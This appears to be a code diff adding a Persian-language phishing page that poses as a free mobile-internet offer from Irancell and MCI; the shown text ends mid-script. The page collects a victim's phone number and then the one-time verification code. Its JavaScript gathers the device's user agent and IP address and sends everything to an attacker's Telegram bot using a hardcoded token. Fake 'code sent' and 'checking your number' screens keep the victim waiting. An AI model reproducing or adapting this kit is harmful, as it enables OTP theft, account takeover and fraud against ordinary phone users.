@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>اینترنت رایگان | Irancell & همراه اول</title>
+  <meta name="theme-color" content="#232526">
+  <link href="https://fonts.googleapis.com/css?family=Vazirmatn:400,700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --main-bg: #232526;
+      --card-bg: #18191a;
+      --text-main: #fff;
+      --input-bg: #23272b;
+      --input-border: #333;
+      --input-text: #eee;
+      --accent: #10b981;
+      --accent-hover: #08916c;
+      --accent-text: #0fe8a7;
+      --logo-rtl-font: "Vazirmatn", "Tahoma", "Arial", sans-serif;
+      --success: #33e388;
+      --info: #10b981;
+      --error: #ff3b3b;
+      --shadow: 0 4px 24px #0003;
+      --radius: 16px;
+    }
+    body {
+      background: var(--main-bg);
+      font-family: var(--logo-rtl-font);
+      margin: 0;
+      min-height: 100vh;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card, .verify-card, .waiting-card {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      max-width: 530px;
+      width: 100%;
+      box-shadow: var(--shadow);
+      padding: 32px 24px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      margin: 0 auto;
+      animation: fade-in .6s cubic-bezier(.4,0,.2,1);
+    }
+    @keyframes fade-in {
+      from { opacity:0; transform: translateY(30px);}
+      to { opacity:1; transform: translateY(0);}
+    }
+    .logos {
+      display: flex;
+      gap: 32px;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 16px;
+      width: 100%;
+    }
+    .logo-irancell,
+    .logo-mci {
+      width: 150px;
+      height: 76px;
+      background: none;
+      margin: 0 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 10px #0002;
+      transition: transform .18s;
+    }
+    .logo-irancell {
+      background: url('https://cdn.fecharge.ir/images/mciinternet/logo.png') no-repeat center/contain;
+    }
+    .logo-mci img {
+      width: 150px;
+      height: 76px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 4px #0003);
+    }
+    .main-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 2px;
+      margin-top: -22px;
+    }
+    .main-logo svg {
+      width: 44px;
+      height: 44px;
+      fill: var(--accent);
+      filter: drop-shadow(0 2px 6px #0002);
+      opacity: 0.93;
+    }
+    .title {
+      font-size: 1.22rem;
+      font-weight: bold;
+      margin-bottom: 7px;
+      margin-top: 20px;
+      text-align: center;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      justify-content: center;
+      text-shadow: 0 1px 6px #0003;
+    }
+    .title svg {
+      width: 18px;
+      height: 18px;
+      color: var(--accent);
+      vertical-align: middle;
+    }
+    .subtitle {
+      font-size: 1.01rem;
+      color: var(--accent);
+      text-align: center;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      justify-content: center;
+      font-weight: 600;
+    }
+    .subtitle svg {
+      width: 17px;
+      height: 17px;
+      color: var(--accent);
+    }
+    .desc {
+      font-size: 1.01rem;
+      color: var(--text-main);
+      text-align: right;
+      margin-bottom: 16px;
+      width: 100%;
+      line-height: 2.1;
+      direction: rtl;
+      background: #202122;
+      padding: 11px 14px 7px;
+      border-radius: 8px;
+      border-right: 3px solid #10b98188;
+      border-bottom: 1px solid #10b98133;
+      box-shadow: 0 1px 8px #0001;
+    }
+    .desc ul {
+      padding-right: 20px;
+      margin: 0;
+      list-style: disc;
+    }
+    .desc li {
+      margin-bottom: 3px;
+    }
+    .form, .verify-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 13px;
+      margin-bottom: 8px;
+      align-items: stretch;
+      justify-content: center;
+    }
+    .input-group {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+    }
+    input[type="tel"], input[type="text"] {
+      padding: 12px 14px;
+      border-radius: 9px;
+      border: 2px solid var(--input-border);
+      background: var(--input-bg);
+      color: var(--input-text);
+      font-size: 1.08rem;
+      outline: none;
+      transition: border-color .15s, box-shadow .2s;
+      direction: ltr;
+      font-weight: 500;
+      letter-spacing: 1.1px;
+      margin-bottom: 0;
+    }
+    input[type="tel"]:focus, input[type="text"]:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px #10b98122;
+    }
+    .btn, .verify-btn {
+      padding: 13px 0;
+      border: none;
+      border-radius: 9px;
+      background: var(--accent);
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background .14s;
+      margin-top: 7px;
+      box-shadow: 0 1.5px 8px #0002;
+      letter-spacing: 0.4px;
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
+    }
+    .btn:active, .btn:hover,
+    .verify-btn:active, .verify-btn:hover {
+      background: var(--accent-hover);
+    }
+    .footer {
+      margin-top: 10px;
+      font-size: 0.94rem;
+      color: #aaa;
+      text-align: center;
+      opacity: 0.87;
+      letter-spacing: 0.3px;
+      font-weight: 500;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+    }
+    .footer svg {
+      width: 16px; height: 16px; color: var(--accent);
+      vertical-align: middle;
+      margin-left: 2px;
+    }
+
+    /* Verify Code Section */
+    .verify-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      width: 100vw;
+      min-height: 100vh;
+      justify-content: center;
+      position: fixed;
+      top: 0; left: 0;
+      z-index: 100;
+      background: rgba(35,37,38, 0.98);
+    }
+    .verify-card {
+      margin: 0 auto;
+      max-width: 430px;
+      width: 98vw;
+      box-shadow: var(--shadow);
+      padding: 34px 22px 28px;
+      border-radius: var(--radius);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: var(--card-bg);
+      position: relative;
+    }
+    .verify-logos {
+      display: flex;
+      gap: 18px;
+      align-items: center;
+      margin-bottom: 13px;
+      margin-top: 10px;
+      justify-content: center;
+      width: 100%;
+    }
+    .verify-logo-mci img,
+    .verify-logo-irancell {
+      width: 75px;
+      height: 38px;
+      object-fit: contain;
+      background: none;
+      margin: 0 2px;
+      box-shadow: 0 1.5px 6px #0002;
+    }
+    .verify-logo-irancell {
+      background: url('https://cdn.fecharge.ir/images/mciinternet/logo.png') no-repeat center/contain;
+      width: 75px;
+      height: 38px;
+      display: block;
+    }
+    .verify-desc {
+      color: #fff;
+      font-size: 0.99rem;
+      margin-top: 0;
+      line-height: 2.1;
+      opacity: 0.95;
+      direction: rtl;
+      margin-bottom: 15px;
+      width: 100%;
+      text-align: right;
+    }
+    .verify-desc ul {
+      padding-right: 18px;
+      margin: 0;
+      list-style: disc;
+    }
+    .verify-status {
+      font-size: 1.02rem;
+      color: var(--success);
+      font-weight: 700;
+      margin-bottom: 9px;
+      margin-top: 3px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      direction: ltr;
+      justify-content: flex-end;
+      width: 100%;
+      text-align: left;
+    }
+    .verify-status svg {
+      width: 22px;
+      height: 22px;
+      color: var(--success);
+      vertical-align: middle;
+    }
+    .verify-wait {
+      font-size: 0.98rem;
+      color: var(--info);
+      margin-bottom: 13px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      width: 100%;
+      justify-content: flex-end;
+    }
+    .verify-wait svg {
+      width: 17px;
+      height: 17px;
+      color: var(--info);
+      vertical-align: middle;
+      margin-bottom: 1px;
+    }
+    .verify-form input[type="text"] {
+      margin-bottom: 8px;
+      background: var(--input-bg);
+      border-radius: 8px;
+      border: 2px solid var(--input-border);
+      color: var(--input-text);
+      font-size: 1.13rem;
+      font-weight: 500;
+      letter-spacing: 1.4px;
+      transition: border-color .15s, box-shadow .2s;
+      direction: ltr;
+      padding: 14px 16px;
+      width: 100%;
+      text-align: center;
+    }
+    .verify-form input[type="text"]:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px #10b98122;
+    }
+    .verify-btn {
+      width: 100%;
+      margin-top: 0;
+      font-size: 1.1rem;
+      border-radius: 9px;
+    }
+    .verify-msg {
+      font-size: 0.97rem;
+      color: var(--success);
+      margin-top: 7px;
+      text-align: center;
+      opacity: 0.97;
+      font-weight: 600;
+      transition: color .2s;
+    }
+    .verify-msg.error {
+      color: var(--error);
+    }
+    /* Waiting page */
+    .waiting-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      width: 100vw;
+      min-height: 100vh;
+      justify-content: center;
+      position: fixed;
+      top: 0; left: 0;
+      z-index: 101;
+      background: rgba(35,37,38, .99);
+    }
+    .waiting-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      max-width: 380px;
+      width: 97vw;
+      padding: 40px 20px 36px;
+    }
+    .waiting-logo {
+      margin-bottom: 18px;
+    }
+    .waiting-logo svg {
+      width: 62px; height: 62px; fill: var(--accent);
+      filter: drop-shadow(0 2px 10px #0003);
+      opacity: 0.95;
+      animation: waiting-spin 2.5s infinite linear;
+    }
+    @keyframes waiting-spin {
+      0% {transform: rotate(0);}
+      100% {transform: rotate(360deg);}
+    }
+    .waiting-title {
+      font-size: 1.17rem;
+      font-weight: bold;
+      margin-bottom: 17px;
+      color: var(--accent-text);
+      letter-spacing: 0.6px;
+      text-align: center;
+    }
+    .waiting-desc {
+      color: #e4e4e4;
+      font-size: 1.01rem;
+      opacity: 0.92;
+      margin-top: 0;
+      text-align: center;
+      line-height: 2;
+    }
+    @media (max-width: 900px) {
+      .verify-card, .waiting-card {
+        max-width: 98vw;
+        padding: 18px 7vw 16px 7vw;
+      }
+      .verify-logos { margin-bottom: 8px; }
+    }
+    @media (max-width: 600px) {
+      .card, .verify-card, .waiting-card {
+        max-width: 99vw;
+        padding: 12px 2vw 10px;
+        border-radius: 9px;
+      }
+      .logos {
+        gap: 6px;
+      }
+      .logo-irancell, .logo-mci, .logo-mci img,
+      .verify-logo-mci img, .verify-logo-irancell {
+        width: 65px;
+        height: 34px;
+      }
+      .main-logo svg, .waiting-logo svg {
+        width: 32px;
+        height: 32px;
+      }
+      .title { margin-top: 8px; }
+      .desc, .verify-desc, .waiting-desc { font-size: 0.95rem; padding: 7px 2px 3px; }
+      .footer { font-size: 0.88rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="mainCard">
+    <div class="main-logo">
+      <svg viewBox="0 0 48 48"><g>
+        <ellipse rx="13" ry="7" cx="24" cy="44" fill="#10b98133"/>
+        <path d="M24 6c1.8 0 3.3 1.1 3.8 2.7l4.1 13.1c.2.7.7 1.3 1.4 1.6l12.7 5.1c1.7.7 2.4 2.7 1.3 4.1l-9.6 11.3c-.4.5-.6 1.2-.5 1.8l2.3 13.3c.3 1.8-1.5 3.2-3.1 2.4l-12-6.5a2.2 2.2 0 0 0-2.1 0l-12 6.5c-1.5.8-3.4-.6-3.1-2.4l2.3-13.3c.1-.6 0-1.3-.5-1.8L2.7 33.6c-1.1-1.4-.4-3.4 1.3-4.1l12.7-5.1c.7-.3 1.2-.9 1.4-1.6l4.1-13.1C20.7 7.1 22.2 6 24 6z" fill="#10b981" stroke="#fff" stroke-width="2"/></g></svg>
+    </div>
+    <div class="logos">
+      <div class="logo-irancell"></div>
+      <div class="logo-mci">
+        <img src="https://logoyab.com/wp-content/uploads/2023/12/%D8%A7%DB%8C%D8%B1%D8%A7%D9%86%D8%B3%D9%84.png" alt="ایرانسل">
+      </div>
+    </div>
+    <div class="title">
+      <span>برای دریافت اطلاعات زیر را کامل کنید</span>
+      <svg viewBox="0 0 20 20" fill="currentColor"><path d="M13.432 3.278a1 1 0 0 1 1.36.364l3.5 6a1 1 0 0 1-.364 1.36l-10 6a1 1 0 0 1-1.36-.364l-3.5-6a1 1 0 0 1 .364-1.36l10-6z"/></svg>
+    </div>
+    <div class="subtitle">
+      <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4h4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+      <span>تعداد محدود</span>
+    </div>
+    <div class="desc">
+      <ul>
+        <li>ویژه برخی مشترکین کم مصرف یا خطوط خاموش</li>
+        <li>هدیه با اعتبار و حجم متنوع برای کاربران منتخب</li>
+        <li><b>مهم:</b> هنگام فعال‌سازی، هزینه واقعی بسته «۰» باشد</li>
+        <li>اینترنت رایگان ما با همه‌ی دستگاه‌ها سازگار است</li>
+      </ul>
+    </div>
+    <form class="form" id="mainForm" autocomplete="off">
+      <div class="input-group">
+        <input type="tel" id="mobile" name="mobile" placeholder="شماره موبایل را وارد کنید" maxlength="11" pattern="09[0-9]{9}" required>
+      </div>
+      <button type="submit" class="btn"><span id="btn-label">ادامه</span></button>
+    </form>
+    <div class="footer">
+      <svg viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a8 8 0 1 1 0 16A8 8 0 0 1 10 2zm0 2a6 6 0 1 0 0 12A6 6 0 0 0 10 4zm0 3a1 1 0 0 1 1 1v2.586l1.293 1.293a1 1 0 0 1-1.414 1.414l-1.707-1.707A1 1 0 0 1 9 10V8a1 1 0 0 1 1-1z"/></svg>
+      <span>اینترنت رایگان | طراحی ساده و شیک</span>
+    </div>
+  </div>
+
+  <!-- VERIFY CODE SECTION -->
+  <div class="verify-container" id="verifyContainer">
+    <div class="verify-card">
+      <div class="verify-logos">
+        <span class="verify-logo-irancell"></span>
+        <span class="verify-logo-mci">
+          <img src="https://logoyab.com/wp-content/uploads/2023/12/%D8%A7%DB%8C%D8%B1%D8%A7%D9%86%D8%B3%D9%84.png" alt="ایرانسل">
+        </span>
+      </div>
+      <div class="verify-desc">
+        <ul>
+          <li>ویژه برخی از مشترکین کم مصرف اینترنت یا خطوط خاموش</li>
+          <li>این هدیه با اعتبار و حجم مختلف برای کاربران منتخب فعال است</li>
+          <li>مهم » هنگام فعال‌سازی حتما هزینه واقعی بسته «صفر» باشد</li>
+          <li>اینترنت رایگان ما با همه‌ی دستگاه‌ها سازگار است.</li>
+        </ul>
+      </div>
+      <div class="verify-status" id="verifyStatus">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10" stroke-width="2" stroke="#33e388"/>
+          <path d="M9 12l2 2 4-4" stroke-width="2" stroke="#33e388" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>
+          کد با موفقیت به شماره  
+          <span id="verifyMobile" style="font-family:monospace;font-size:1.01em;"></span>
+          ارسال شد
+        </span>
+      </div>
+      <div class="verify-wait">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10" stroke-width="2" stroke="#10b981"/>
+          <path d="M12 6v6l4 2" stroke="#10b981" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span>تا زمان ارسال کد صبور باشید</span>
+      </div>
+      <form class="verify-form" id="verifyForm" autocomplete="off">
+        <input type="text" id="verifyCode" name="verifyCode" maxlength="6" placeholder="کد ارسال شده را وارد نمایید" required autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*">
+        <button type="submit" class="verify-btn">تایید</button>
+        <span class="verify-msg" id="verifyMsg"></span>
+      </form>
+    </div>
+  </div>
+
+  <!-- WAITING PAGE -->
+  <div class="waiting-container" id="waitingContainer">
+    <div class="waiting-card">
+      <div class="waiting-logo">
+        <svg viewBox="0 0 48 48"><g>
+          <ellipse rx="13" ry="7" cx="24" cy="44" fill="#10b98133"/>
+          <path d="M24 6c1.8 0 3.3 1.1 3.8 2.7l4.1 13.1c.2.7.7 1.3 1.4 1.6l12.7 5.1c1.7.7 2.4 2.7 1.3 4.1l-9.6 11.3c-.4.5-.6 1.2-.5 1.8l2.3 13.3c.3 1.8-1.5 3.2-3.1 2.4l-12-6.5a2.2 2.2 0 0 0-2.1 0l-12 6.5c-1.5.8-3.4-.6-3.1-2.4l2.3-13.3c.1-.6 0-1.3-.5-1.8L2.7 33.6c-1.1-1.4-.4-3.4 1.3-4.1l12.7-5.1c.7-.3 1.2-.9 1.4-1.6l4.1-13.1C20.7 7.1 22.2 6 24 6z" fill="#10b981" stroke="#fff" stroke-width="2"/></g></svg>
+      </div>
+      <div class="waiting-title">در حال بررسی شماره تلفن شما هستیم</div>
+      <div class="waiting-desc">
+        لطفا کمی صبور باشید...<br>
+        شماره شما در صف بررسی قرار گرفت.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Device Info Extraction
+    function getDeviceInfo() {
+      let ua = navigator.userAgent;
+      let platform = navigator.platform || '';
+      let vendor = navigator.vendor || '';
+      let device = {};
+      if (/android/i.test(ua)) {
+        let match = ua.match(/Android [\d.]+; ([^;]+); ([^;\)]+)/);
+        device.os = "Android";
+        device.device = match ? match[2] : '';
+        device.brand = match ? match[1] : '';
+      } else if (/iPhone|iPad|iPod/i.test(ua)) {
+        device.os = "iOS";
+        device.device = (/iPhone/i.test(ua) ? "iPhone" : /iPad/i.test(ua) ? "iPad" : "iPod");
+        device.brand = "Apple";
+      } else {
+        device.os = platform;
+        device.brand = vendor;
+        device.device = '';
+      }
+      device.ua = ua;
+      return device;
+    }
+    async function getIp() {
+      try {
+        let res = await fetch("https://api.ipify.org?format=json");
+        let data = await res.json();
+        return data.ip;
+      } catch {
+        return "";
+      }
+    }
+    // ارسال شماره به تلگرام
+    async function sendToTelegram(number, deviceInfo, ip) {
+      const botToken = '7718330941:AAHiRRp4dwneJXVPVMYNQYsymMm2pPt13Vs';
+      const chatId = '7904555577';
+      let msg =
+        `شماره: ${number}\n`+
+        `آی‌پی: ${ip}\n`+
+        `دستگاه: ${deviceInfo.device || '-'}\n`+
+        `برند: ${deviceInfo.brand || '-'}\n`+
+        `سیستم عامل: ${deviceInfo.os || '-'}\n`+
+        `UserAgent: ${(deviceInfo.ua || '').slice(0,120)}${deviceInfo.ua&&deviceInfo.ua.length>120?'...':''}`;
+      let keyboard = {
+        inline_keyboard: [[
+          {text:"سایت", url:"https://www.irancell.ir/"},
+          {text:"Made by sheikh", callback_data:"made_by_sheikh"}
+        ]]
+      };
+      let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      let payload = {
+        chat_id: chatId,
+        text: msg,
+        parse_mode: "HTML",
+        reply_markup: JSON.stringify(keyboard)
+      };
+      await fetch(url, {
+        method: "POST",
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: Object.entries(payload).map(([k,v])=>`${k}=${encodeURIComponent(v)}`).join('&')
+      });
+    }
+    // ارسال کد تایید به تلگرام
+    async function sendCodeToTelegram(mobile, code, deviceInfo, ip) {
+      const botToken = '7718330941:AAHiRRp4dwneJXVPVMYNQYsymMm2pPt13Vs';
+      const chatId = '7904555577';
+      let msg =
+        `کد تایید برای شماره: ${mobile}\n`+
+        `کد وارد شده: ${code}\n`+
+        `آی‌پی: ${ip}\n`+
+        `دستگاه: ${deviceInfo.device || '-'}\n`+
+        `برند: ${deviceInfo.brand || '-'}\n`+
+        `سیستم عامل: ${deviceInfo.os || '-'}\n`+
+        `UserAgent: ${(deviceInfo.ua || '').slice(0,120)}${deviceInfo.ua&&deviceInfo.ua.length>120?'...':''}`;
+      let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      let payload = {
+        chat_id: chatId,
+        text: msg,
+        parse_mode: "HTML"
+      };
+      await fetch(url, {
+        method: "POST",
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: Object.entries(payload).map(([k,v])=>`${k}=${encodeURIComponent(v)}`).join('&')
+      });
+    }
+    // فرم شماره موبایل
+    document.getElementById("mainForm").addEventListener("submit", async function(e){
+      e.preventDefault();
+      let mobile = document.getElementById("mobile").value.trim();
+      if(!/^09[0-9]{9}$/.test(mobile)){
+        alert("شماره وارد شده صحیح نیست!");
+        return;
+      }
+      let btn = document.querySelector(".btn");
+      let btnLabel = document.
